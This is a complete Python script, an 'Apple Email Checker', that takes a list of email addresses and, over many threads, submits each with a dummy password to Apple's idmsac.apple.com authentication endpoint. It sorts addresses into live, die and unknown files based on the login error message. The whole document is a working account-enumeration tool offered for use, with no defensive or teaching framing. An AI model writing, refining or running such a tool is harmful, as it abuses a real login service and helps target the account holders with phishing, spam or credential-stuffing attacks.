import requests
import time
import threading
import queue
from datetime import datetime


class Apple():
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
    die = 'Your Apple ID or password was entered incorrectly.'
    inputQueue = queue.Queue()

    def __init__(self):

        print(r"""
          _____  _____  _      ______   ______                 _ _  _____ _               _             
    /\   |  __ \|  __ \| |    |  ____| |  ____|               (_) |/ ____| |             | |            
   /  \  | |__) | |__) | |    | |__    | |__   _ __ ___   __ _ _| | |    | |__   ___  ___| | _____ _ __ 
  / /\ \ |  ___/|  ___/| |    |  __|   |  __| | '_ ` _ \ / _` | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
 / ____ \| |    | |    | |____| |____  | |____| | | | | | (_| | | | |____| | | |  __/ (__|   <  __/ |   
/_/    \_\_|    |_|    |______|______| |______|_| |_| |_|\__,_|_|_|\_____|_| |_|\___|\___|_|\_\___|_|   
                                                                                                        
                                                                                                        
		""")

        self.mailist = input("Email List Path ? ")
        self.thread = input("How many threads ? ")
        self.countList = len(list(open(self.mailist)))
        

    def save_to_file(self, nameFile, x):
        kl = open(nameFile, 'a+')
        kl.write(x)
        kl.close()

    def clean_result(self):
        open('result/live.txt', 'w').close()
        open('result/die.txt', 'w').close()
        open('result/unknown.txt', 'w').close()

    def post_email(self, eml):
        try:
            r = requests.post('https://idmsac.apple.com/authenticate',
                            data={
                                  'accountPassword': 'xxxxxx',
                                  'appleId': eml,
                                  'appIdKey': 'c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80'
                            },
                            headers={
                                  'User-Agent': self.ua,
                                  'Content-Type':'application/x-www-form-urlencoded'
                            }
                )
            if self.die in r.text:
                return 'die'
            else:
                return 'live'
        except:
            return 'unknown'

    def chk(self):

        while 1:
            eml = self.inputQueue.get()
            rez = self.post_email(eml)
            time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            if rez == 'die':
                print('[+] '+time+' - DIE - '+eml +
                      ' - [Apple Email Checker]')
                self.save_to_file('result/die.txt', eml+'\n')

            elif rez == 'live':
                print('[+] '+time+' - LIVE - '+eml +
                      ' - [Apple Email Checker]')
                self.save_to_file('result/live.txt', eml+'\n')

            elif rez == 'unknown':
                print('[+] '+time+' - UNKNOWN - '+eml +
                      ' - [Apple Email Checker]')
                self.save_to_file('result/unknown.txt', eml+'\n')

            else:
                print('contact coder')

            self.inputQueue.task_done()

    def run_thread(self):
        for x in range(int(self.thread)):
            t = threading.Thread(target=self.chk)
            t.setDaemon(True)
            t.start()
        for y in open(self.mailist, 'r').readlines():
            self.inputQueue.put(y.strip())
        self.inputQueue.join()

    def finish(self):
        print('')
        print('Checking', self.countList, 'emails has been completed successfully')
        print('')
        print('Live    : ', len(list(open('result/live.txt'))), 'emails')
        print('Die     : ', len(list(open('result/die.txt'))), 'emails')
        print('Unknown : ', len(list(open('result/unknown.txt'))), 'emails')
        print('')


heh = Apple()
heh.run_thread()
heh.finish()
